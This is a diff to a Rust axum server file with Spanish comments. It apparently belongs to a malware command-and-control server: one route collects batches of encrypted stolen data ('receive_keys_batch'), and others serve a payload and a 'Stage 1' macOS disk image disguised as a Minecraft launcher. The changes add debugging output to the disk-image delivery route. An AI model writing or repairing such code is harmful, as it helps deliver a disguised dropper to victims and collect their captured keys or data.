@@ -1,8 +1,8 @@
 // routes.rs
 use axum::{
     extract::State,
-    http::StatusCode,
-    response::{Json, Response},
+    http::{StatusCode, header},
+    response::{Json, Response, IntoResponse},
     routing::{get, post},
     Router,
 };
@@ -60,6 +60,7 @@ pub async fn receive_keys_batch(
     for encrypted_payload in payloads {
         let encrypted = encrypted_payload["data"].as_str().unwrap_or("");
         if encrypted.is_empty() {
+            eprintln!("⚠️ Dato cifrado vacío en lote");
             continue;
         }
 
@@ -98,16 +99,25 @@ pub async fn serve_payload() -> Vec<u8> {
 }
 
 // ============================================================
-// Servir la App de Minecraft (Stage 1) como .dmg
+// Servir la App de Minecraft (Stage 1) - CORREGIDO PARA .dmg
 // ============================================================
 
 pub async fn serve_stage1_app() -> Response {
+    // Ruta absoluta usando CARGO_MANIFEST_DIR
     let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
         .join("payloads/MinecraftLauncher.dmg");
 
+    println!("📤 Intentando servir: {:?}", path);
+    println!("📤 ¿Existe? {}", path.exists());
+
+    match std::fs::metadata(&path) {
+        Ok(meta) => println!("📤 Tamaño: {} bytes", meta.len()),
+        Err(_) => println!("📤 Tamaño: N/A (no existe)"),
+    }
+
     match std::fs::read(&path) {
         Ok(data) => {
-            println!("✅ DMG servido ({} bytes)", data.len());
+            println!("✅ Archivo leído ({} bytes)", data.len());
             Response::builder()
                 .status(StatusCode::OK)
                 .header("Content-Type", "application/x-apple-diskimage")
@@ -116,7 +126,7 @@ pub async fn serve_stage1_app() -> Response {
                 .unwrap()
         }
         Err(e) => {
-            eprintln!("❌ Error: {}", e);
+            eprintln!("❌ Error leyendo archivo: {}", e);
             Response::builder()
                 .status(StatusCode::NOT_FOUND)
                 .body(axum::body::Body::from(format!("Archivo no encontrado: {}", e)))
@@ -124,5 +134,3 @@ pub async fn serve_stage1_app() -> Response {
         }
     }
 }
-
-
